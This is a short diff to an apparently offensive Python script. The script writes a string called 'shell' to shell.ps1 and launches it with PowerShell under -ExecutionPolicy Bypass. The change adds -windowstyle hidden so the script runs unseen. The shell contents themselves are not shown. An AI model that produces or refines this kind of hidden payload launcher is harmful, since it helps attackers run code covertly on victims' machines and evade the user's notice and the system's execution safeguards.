@@ -10,4 +10,4 @@ shell = """
 with open("shell.ps1","w") as file:
 	file.write(shell)
 
-os.system('powershell.exe -ExecutionPolicy Bypass -File shell.ps1')
+os.system('powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File shell.ps1')
